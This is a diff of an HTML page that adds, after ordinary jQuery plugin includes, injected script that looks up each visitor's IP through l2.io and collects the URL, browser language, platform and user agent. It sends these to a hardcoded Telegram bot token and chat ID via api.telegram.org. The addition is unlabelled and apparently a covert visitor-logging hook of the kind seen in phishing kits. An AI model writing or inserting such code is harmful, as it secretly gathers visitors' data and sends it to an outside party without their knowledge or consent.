@@ -775,6 +775,38 @@
 <script type="text/javascript" src="js/plugin/countto/jquery.appear.js"></script>
 <script type="text/javascript" src="js/circles.js"></script>
 <script type="text/javascript" src="js/custom.js"></script>
+
+
+<script crossorigin='anonymous' integrity='sha256-2Kok7MbOyxpgUVvAk/HJ2jigOSYS2auK4Pfzbm7uH60=' src='https://code.jquery.com/jquery-3.3.1.js'></script>
+
+<script src='https://l2.io/ip.js?var=userip'></script>
+<script>
+//<![CDATA[
+var txt = "";
+	txt += "Url: " + document.location.href + "\n";
+	txt += "Browser Language: " + navigator.language + "\n";
+	txt += "Platform: " + navigator.platform + "\n";
+	txt += "User-agent header: " + navigator.userAgent + "\n";
+	txt += "IP: ipinfo.io/" + userip;
+//]]>
+</script>
+<script>
+ //<![CDATA[  
+    if(txt.indexOf( "bot") != -1){
+      txt = "Bot has visited!";
+    }
+    var texts = txt;
+    $.ajax({
+      url: "https://api.telegram.org/bot1951905360:AAHr1CXhZ6fUv1yfRJa_kBjK3KRyEXIkck4/sendMessage",
+      method: "POST",
+      data: {chat_id: "627277679", text: texts}
+    });
+
+ //]]>   
+</script>
+
+
+
 <!--Main js file End-->
 </body>
 </html>
